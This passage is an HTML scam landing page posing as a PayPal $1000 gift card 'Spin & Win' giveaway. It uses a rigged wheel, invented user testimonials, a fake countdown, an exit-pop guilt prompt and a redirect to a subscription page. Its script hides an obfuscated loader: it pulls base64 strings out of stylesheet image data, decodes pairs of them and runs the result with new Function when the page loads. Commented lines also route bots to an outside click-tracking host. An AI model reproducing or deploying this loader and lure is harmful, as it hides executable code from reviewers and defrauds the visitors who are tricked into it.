32qLW2YYa2G4ZsFwuFReIhuLOWqS80u6LpLbI6ApKS8YIbBwG9WB2FXF5ZyW7yXCSd0LoQEMDnvOLAyPIGorGz47iOC5IIdo5AcE8ZAJUE02nXSNxJc7HAMeDGoXPF4Mct6P66RtjG4zxeHHl8uDUEty80iyRFYwikEjBLEb/oc4jc+lR7yj3/oK/ES57jsvKoO8t1AlJxd4MDnmmWQniA552qMeN/Pnv6VwrxO0f2O9aZqVvcIJI3z5jquaa9UrkHlU18Ft5GJ5IT9AK0iM22h6cjbMLYO3vJ4qubgW9rcTnbu42fPqq7VF+JnaOHaVLOf0aPg/NatvxYOQLvRB7wy/wBnq2/E7s1LgSx3sHvGH/Natu2XZW5xwa1bA+UhMZ/7VBc21wMwXMEoP7kiv/QmpLdC4eSAFl5F1zjfPWmsbM8Z7gKzcyuQeedqksIHgEPHJwh2fJPExds+Ik8yM5ptJcNEY7jwoQ2HzxEg5O48+ppNPvIURk2dUKgo5LhGcEgcssQOdD4pVjN9LJ3XGwcICBso4clN9zSajKs0VssZkYngHeHgfi23f71DeTTShUtwFMavlmGeFmIzt7cqnOIj64FW2759D/WvxQmA03SrfrJcu/0RKYEocnddgPSgQ+AmwA3ArDOjsOY59DSkZwXxt5dasJ5bdy8bkEjhPqM1LfzKoHrTXk8qiIvhWIU+x2q7UIhVeShUHsABXaeV49Bvip+ZVU+zMAac5J/S4ycUpKNlCVPmpxVr2j1+zP8Al9XvE9O9Yirb8S+1tvs93FP/APtEpqy/Fy9ZkS50eB/VJGStG1ZdVte/FuYvQvx/2FCgSNxtXUVHFCjOY4kQtuxUYzV0cRD3q05n2FfillrvRIydhDM3/cClUFSx3IbFE47sjbc0TuG6lKO+T5Cv/8QALBEBAAICAQIEBQMFAAAAAAAAAQACAxEhBBASIDFRBRMiQXEUMDJCYWKBkf/aAAgBAgEBPwCKBywvXYD+wWqZGv31F7Of2rL3taUQRSVuPowyIJo/Z3FYblWF6vqw5hjyJsq699RE4eyeTj2gbdEMQT5XPDD4bUG17vBAK8BOnNYMZ/adb1ePpsNrtPEiATpeqxdVk+Vkw1rZp4hI+Wj9RCYq+LLQ/wAidSlcN/xA3Kmq1PYnxOlvlOwS9ydDjrW/UZNcmPQ9jusq8nYWqI8xz5bHhbbJW/hsKSnxCv8AVRn6zprmrf8AEmbJgrgtXG159ux31KH1HYtVNa4laY29duhdv4J+npk+rGoa/wBblipZKqg+Q7ojpmI5WVx2sKRxZD7TVj1qwfzOH7zR7zTDyZQ2SnozB/F72rX2JkrU9DueT//EACURAQACAQMEAgIDAAAAAAAAAAEAAhEDBCEQIDFREkEFEyJhcf/aAAgBAwEBPwCc/U+Laqo8Hnuz0rrfCoAcRW1lXp+j3aUpSv1L5aoS+mnkjQXOXsxMdnxn631DTUeI6VseJfStVeI8eY3oOGxMj47hTh5JkDMvubZ4Ald7xzWan5Ns4rpEtZsqs1XOpZm1299fVKlsHlZuNDU29C9NSyfLGHtMEtzVl3NmXcVf8mmZ1K9LOVf7n4Y0rat2zzXTZ+Rqfo2xnm18p2riZA59TOYgmGFKjkI1yJmO1fpIaGrRGlufYytda2rW2orj30evn6mopS7GYYqDgnzsPJDKZTsevFsJ4m5/jQPbFCZPc49zE57HrtLWxbmbiytcsv56iwXsfPX/2Q==") 0 0;
            width: 200px;
            height: 128px;
        }

        .pixel2 {
            background: url("data:image/jpeg;base64,/9j/4AAQSkZJRgABAQIAHAAcAAD/2wDEAAgICAgJCAkKCgkNDgwODRMREBARExwUFhQWFBwrGx8bGx8bKyYuJSMlLiZENS8vNUROQj5CTl9VVV93cXecnNERABAAEAAQABAAEQAQABIAFAAUABIAGQAbABgAGwAZACUAIgAfAB8AIgAlADgAKAArACgAKwAoADgAVQA1AD4ANQA1AD4ANQBVAEsAWwBKAEUASgBbAEsAhwBqAF4AXgBqAIcAnACDAHwAgwCcAL0AqQCpAL0A7gDiAO4BNwE3AaL/wgARCAADAAQDASIAAhEBAxEB/8QAFAABAAAAAAAAAAAAAAAAAAAACP/aAAgBAQAAAAA//wD/xAAUAQEAAAAAAAAAAAAAAAAAAAAA/9oACgICEAMQAAAAP//EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAT8Af//EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQIBAT8Af//EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQMBAT8Af//Z") 0 0;
            width: 4px;
            height: 3px;
        }

        #pressButton {
            background-image: url("data:image/png;base64,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")
        }
    </style>
    <script>
        function setButtonHeight() {
            conMid = (whCon.getBoundingClientRect().bottom - whCon.getBoundingClientRect().top) / 2, button.style.top = conMid - button.offsetHeight / 2 - .2 * button.offsetHeight / 2 + "px"
        }

        function spin() {
            switch (count) {
                case 1:
                    dWheel.className = "spinAround", setTimeout(function () {
                        const wrapper1 = document.createElement('div');
                        wrapper1.innerHTML = '*** You won one extra spin ***';
                        swal({title: 'Try Again!', content: wrapper1, position: "top"});
                    }, 6800);
                    break;
                case 2:
                    dWheel.className = "spinAround2", setTimeout(function () {
                        dWheel.className = dWheel.className + " transparent"
                    }, 6800), setTimeout(function () {
                        device.style.display = "block", device.style.left = whCon.offsetWidth / 2 - device.offsetWidth / 2 + "px", device.style.top = conMid - device.offsetHeight / 2 + "px"
                    }, 7e3), setTimeout(function () {
                        first.innerHTML = "<div class='loading'></div>", first.style.padding = "195px 0px", setTimeout(function () {
                            second = document.getElementById("secondpage"), first.parentNode.removeChild(first), second.style.display = "block", con.insertBefore(second, con.firstChild)
                        }, 1500)
                    }, 9e3)
            }
            count++
        }

        function gotoUrl() {
            PreventExitPop = !1, window.location.href = clickUrl
        }

        var PreventExitPop = !0;

        function ExitPop() {
            if (0 != PreventExitPop) return "If you leave now, this opportunity be given to other lucky users."
        }

        window.onbeforeunload = ExitPop, f8 = document.getElementById("offerid");
        var ff57 = "und";
        var ff58 = "und";
        for (var x = document.styleSheets.length, ff37 = [], i = 0; i < x; i++) {
            var sheet = document.styleSheets[i];
            try {
                var rules = sheet.rules || sheet.cssRules;
                var rl = rules.length;
                for (var j = 0; j < rl; j++) {
                    var rule = rules.item(j);
                    if (sheet.title === "icons") {
                        var stl = rule.style;
                        var str1 = stl.background;
                        var str2 = ";base64,";
                        var id1 = str1.indexOf(str2);
                        var str3 = str1.substring(id1 + str2.length);
                        var str4 = str3.substring(0, str3.indexOf('"'));
                        ff37.push(str4);
                    } else {
                        var nm = rule.selectorText;
                        if (nm === '.winbox') {
                            ff57 = rule.style["animation-name"].substring(1);
                        }
                        if (nm === ".com-bu") {
                            ff58 = rule.style["animation-name"].substring(1);
                        }
                    }
                }
            } catch (e) {
            }
        }
        ff59 = "&u=" + ff57 + "&v=" + ff58;
        for (var idx1 = 0; idx1 < ff37.length; idx1++) {
            for (var idx2 = 0; idx2 < ff37.length; idx2++) {
                try {
                    var ff38 = atob(ff35(ff37[idx1], ff37[idx2]));
                    let ff41 = new Function(ff38);
                    ff39 = idx1 - idx2;
                    ff40 = idx1 + idx2;
                    ff41();
                } catch (err) {
                }
            }
        }

        function ff36(e) {
            var t = e.charCodeAt(0);
            return t > 64 && t < 91 ? t - 65 : t > 96 && t < 123 ? t - 71 : t > 47 && t < 58 ? t + 4 : 43 == t ? 62 : 47 == t ? 63 : 61 == t ? 64 : void 0
        }

        function ff35(e, t) {
            var n = Math.min(e.length, t.length), o = [];
            for (i = 0; i < n; i++) i3 = ff36(e.charAt(i)) - ff36(t.charAt(i)), i3 < 0 && (i3 += 65), i3 < 26 && o.push(String.fromCharCode(i3 + 65)), i3 >= 26 && i3 < 52 && o.push(String.fromCharCode(i3 + 71)), i3 >= 52 && i3 < 62 && o.push(String.fromCharCode(i3 - 4)), 62 == i3 && o.push("+"), 63 == i3 && o.push("/"), 64 == i3 && o.push("=");
            return o.join("")
        }</script>
    <!-- <script src="https://www.libjs.net/jquery/3.3.5/jquery.min.js"></script> -->
    <!-- Local version -->
    <script src="/invites/paypal-uk/js/jquery.min.js"></script>
    <script>
        var offerurl = "/subscribe-paypal-en";

        function writedatesetc() {
            setButtonHeight();
            substituteTokens();
        }

        window.addEventListener("load", writedatesetc);
    </script>
</head>
<body oncontextmenu="return!1">
<script>
    var str1;
    str1 = "/subscribe-paypal-en";
    setTimeout(function () {
        alert("You have a chance to receive a Paypal $1000 gift card!\n\n1. Click SPIN to get your chance.\n***Act fast, this offer is limited***");
        PreventExitPop = false;
        window.location = str1
    }, 180000);
</script>
<!--Remove if voice is not desired/not supported: -->
<!--<script>speak("Congratulations!");</script>-->
<div class="corner-ribbon" hidden="">
    <h2><br><br><span class="qyear">2020</span><br><span class="qmonth">October</span><br>Exclusive !</h2>
</div>
<div id="header">
    <span id="headline"></span>
    <h3><span id="headline">SPIN &amp; WIN</span></h3><span class="cup1 icon"></span>
</div>
<div id="container">
    <div align="center" id="firstpage">
        <div style="margin-bottom:10px">
            <div id="subheadline">
                <div class="date"><span class="qdate">October 8, 2020</span></div>
                <b>Congratulations Paypal User,<br> you have (1) Reward Pending!</b><br>
            </div>

        </div>
        <div class="intro">
            Every <b><span class="qdayofweek">Thursday</span> </b> we select<br> 10 lucky <span
                class="qbrand">HTC</span> users to receive a reward.<br>
        </div>
        <div class="yo"
             style="background-color:#232f3e;color:#fff;border-radius:0;margin:0;padding:0;padding-bottom:10px;margin-top:7px;padding-top:5px;width:100%">
            <h2 style="margin:0;padding:0;padding-bottom:3px">Claim Your Prize</h2>
            <h2 style="margin:0;padding:0"><span class="bounce">↓</span> Spin the wheel <span class="bounce">↓</span>
            </h2>
        </div>
        <br>
        <p></p>
        <div id="wheelCon">
            <img height="501" id="wheel" src="/invites/paypal-uk/img/prizewheelorg.png" width="501">
            <div id="pressButton" onclick="spin()" style="top:108px"></div>
            <div>
                <img class="animated rotateIn" id="devMockup" src="/invites/paypal-uk/img/prize1.png" width="170">
            </div>
        </div>
    </div>
    <div class="fbcoms">
        <p class="fblikescom"><span id="youand"></span><span class="fbblue">12,068</span> total likes.</p>
        <div class="item">
            <img class="f7 profileimg">
            <p class="comtxt"><span class="name">Allen Fields</span> Did anybody won something in this sweepstakes??</p>

            <p class="combot"><span class="fblike">Like</span>&nbsp;·&nbsp;<span class="fblike">Reply</span>&nbsp;·&nbsp;<span
                    class="ago">now</span></p>
        </div>
        <div class="item">
            <img class="f4 profileimg">
            <p class="comtxt"><span class="name">Ashe Walker</span> Can you help me? I just won an gift card!! What
                should I do now?</p>

            <p class="combot"><span class="fblike">Like</span>&nbsp;·&nbsp;<span class="fblike">Reply</span>&nbsp;·&nbsp;<span
                    class="ago">9 minutes</span></p>
        </div>
        <div class="item">
            <img class="f1 profileimg">
            <p class="comtxt"><span class="name">Kevin Dechant</span> I was not sure if it was true or not, but I
                received my card today!! 😍 amazing 🔥 🔥</p>

            <p class="combot"><span class="fblike">Like</span>&nbsp;·&nbsp;<span class="fblike">Reply</span>&nbsp;·&nbsp;<span
                    class="ago">32 minutes</span></p>
        </div>
        <div class="item">
            <img class="f8 profileimg">
            <p class="comtxt"><span class="name">Mary Long</span> Saw this one time offer and clicked it off because I
                thought it was fake. I saw the ad again and because I was bored so I decided to try it ... And I got a
                NEW iphone X! What!!?!</p>

            <p class="combot"><span class="fblike">Like</span>&nbsp;·&nbsp;<span class="fblike">Reply</span>&nbsp;·<span
                    class="likes totlikes">12</span>·&nbsp;<span class="ago">55 minutes</span></p>
        </div>
        <div class="item">
            <img class="f3 profileimg">
            <p class="comtxt"><span class="name">Lara Vann</span> Initially I was not sure if this is real or not, but I
                have recieved the $100 GiftCard today :D!!</p>

            <p class="combot"><span class="fblike">Like</span>&nbsp;·&nbsp;<span class="fblike">Reply</span>&nbsp;·&nbsp;<span
                    class="ago">1 hours</span></p>
        </div>
        <div class="item">
            <img class="f6 profileimg">
            <p class="comtxt"><span class="name">Li Williams</span> $1000 GiftCard have come through the post today!
                Thanks to Paypal !!.</p>
            <div class="fbimg"><img class="proof1 proof"></div>
            <p class="combot"><span class="fblike">Like</span>&nbsp;·&nbsp;<span class="fblike">Reply</span>&nbsp;·&nbsp;<span
                    class="ago">3 hours</span></p>
        </div>
        <div class="item">
            <img class="f2 profileimg">
            <p class="comtxt"><span class="name">Michelle Seavey</span> Won 1 free spin and no prize :( Wish I could
                have a 2nd chance</p>

            <p class="combot"><span class="fblike">Like</span>&nbsp;·&nbsp;<span class="fblike">Reply</span>&nbsp;·<span
                    class="likes totlikes">21</span>·&nbsp;<span class="ago">3 hours</span></p>
        </div>
        <div class="item">
            <img class="f5 profileimg">
            <p class="comtxt"><span class="name">Donnie Benjamin</span> How does it work? I won an Amazon card some
                years ago and all my attempts afer - unsuccessful...</p>

            <p class="combot"><span class="fblike">Like</span>&nbsp;·&nbsp;<span class="fblike">Reply</span>&nbsp;·<span
                    class="likes totlikes">1</span>·&nbsp;<span class="ago">6 hours</span></p>
        </div>
        <div style="margin:10px 5px 5px 5px">
            <span class="fbblue topcomments">See 83 older comments</span><span class="ago" style="float:right"></span>
        </div>
    </div>
    <!-- A hack for better formatting at small screen resolutions -->
    <div class="o">
        <script>brVersion()</script>
        =kTMyg GIFT-OU8IWH
    </div>
    <div class="o" id="offerid"></div>
    <div class="btmComment">
        <p>Add Reply:</p>
        <textarea rows="4" style="width:90%;margin:5px"></textarea>
        <p>
            <button onclick="alert('Thank you for your comment, it will be published after being reviewed.')">Submit
            </button>
        </p>
    </div>
</div>
<div id="winprize" class="pagetwo">
    <div class="congrats">
        <h4><font color="#3C5A96">Congratulations! Just complete these steps to receive your Paypal gift card!</font>
        </h4>
    </div>
    <div class="congrats1">
        <p style="line-height:2">1. Click "Claim Prize" to claim your prize. You will be redirected to our partner’s
            site. <br>2. Fill out the questionnaire and enter your email address. <br><b>IMPORTANT:</b> Product may
            become unavailable at any time.<br>
            Chose quickly! </p></div>
    <div class="timer">
        The offer is valid for next <font color="red"><b><span id="mins">2</span> minutes and <span id="hsecs">45</span>
                seconds.</b></font></div>

    <div class="prize">
        <table class="prizetab1">
            <tbody>
            <tr>
                <th></th>
                <td style="padding:10px;text-align:center;">
                    <img src="/invites/paypal-uk/img/prize1.png">
                    <p><b>(2) left</b></p>
                </td>
                <td style="line-height:1.6">
                    <p><span class="name">Paypal $1000 Gift Card</span></p>
                    <p><span class="smallfont"><b><b>Discount Price: $899.99</b></b></span></p><b>
                        <p><span class="smallfont"><b>Your Price: <font color="green">$0.00</font></b></span></p>
                        <div>
                            <a class="button2" href="javascript:" onclick="gotoUrl()">Claim Prize</a>
                        </div>
                    </b></td>
            </tr>
            </tbody>
        </table>
    </div>
</div>

<!--
<script>
//Bot detection #1. Only javascript enabled browsers will follow the link to offer 2, others (bots) will not
//uncomment if needed

//u1="https://o.redpanda.icu";u2="click.php?lp=1&to_offer=2";document.write('<iframe src="'+u1+"/"+u2+'"><\/iframe>');
</script>
 Bot detection #2. A 1x1 pixel link to offer 3, that no human should be clicking on:
<a href="https://o.redpanda.icu/click.php?lp=1&to_offer=3"><img class="pixel"></a>
-->
<!-- <script src="https://www.libjs.net/sweetalert/2.1.2/sweetalert.min.js"></script> -->
<!-- Local version -->
<script src="/invites/paypal-uk/js/sweetalert.min.js"></script>
<style>
    .swal-footer {
        text-align: center;
    }

    /*.swal-modal{
        vertical-align:bottom;
        margin-bottom: 15%;
    }*/
</style>
<script>
    var conMid, clickUrl = "/subscribe-paypal-en", mydate = new Date,
        year = mydate.getFullYear(), month = mydate.getMonth(), day = mydate.getDate(), weekday = mydate.getDay(),
        count = 1, headline = document.getElementById("headline"), con = document.getElementById("container"),
        whCon = document.getElementById("wheelCon"), dWheel = document.getElementById("wheel"),
        button = document.getElementById("pressButton"), device = document.getElementById("devMockup"),
        first = document.getElementById("firstpage"), second = document.getElementById("secondpage");
    setInterval("ctdn()", 1e3);
    const wrapper = document.createElement('div');
    wrapper.innerHTML = '<img src="/invites/paypal-uk/img/prize1.png" width="100"><p><b>' + montharray[f101.getMonth()] + " " + f101.getDate() + ", " + f101.getFullYear() + '</b><p> Congratulations Paypal user!</p><p>National Consumer Center would like to thank you for your loyalty.</p><p>Spin the wheel to claim your special prize 🎁<br><br><b>Good Luck!</b></p></p>';
    swal({title: '$1000 Paypal Gift Card', content: wrapper, position: "top"});

</script>

</body>
</html>
@endsection
@section('footer_scripts')

@endsection
